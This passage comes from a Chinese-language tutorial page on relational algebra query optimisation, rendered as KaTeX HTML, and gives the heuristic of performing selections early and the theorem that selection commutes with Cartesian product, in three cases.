style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)))</span></span></span></span></span></eqn></section></p><p>尽可能地早做选择</p><h5 id="%E5%AE%9A%E7%90%86l6%EF%BC%9A%E9%80%89%E6%8B%A9%E5%90%88%E7%A7%AF%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L6：选择合积的交换律</h5><p>设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是关系代数表达式</p><ul><li>(1):若条件F只涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中的属性：则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_F(E_1\times E_2)\equiv \sigma_{F}(E_1)\times(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></li><li>(2):若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>=</mo><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F=F_1\wedge F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,分别只涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中属性，则有：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>1</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>2</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_F(E_1\times E_2)\equiv \sigma_{F_1}(E_1)\times \sigma_{F_2}(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></li><li>(3):若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>=</mo><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F=F_1\wedge F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>只涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中属性，而<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中属性，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><mi>E</mi><mn>1</mn><mo>×</mo><mi>E</mi><mn>2</mn><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>2</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>1</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_F(E1\times E2)\equiv \sigma_{F_2}(\sigma_{F_1}(E_1)\times E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span 